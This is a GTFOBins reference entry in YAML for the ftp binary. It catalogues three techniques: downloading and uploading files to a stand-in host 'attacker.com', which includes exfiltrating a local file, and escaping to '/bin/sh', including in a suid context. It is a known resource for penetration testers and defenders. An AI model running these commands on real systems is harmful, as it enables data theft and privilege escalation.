<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ftp -->
---
functions:
  download:
  - code: |-
      ftp -a attacker.com
      get /path/to/input-file output-file
    comment: |-
      Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: ftp-server
  shell:
  - code: |-
      ftp
      !/bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  upload:
  - code: |-
      ftp -a attacker.com
      put /path/to/input-file output-file
    comment: |-
      Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: ftp-server
...
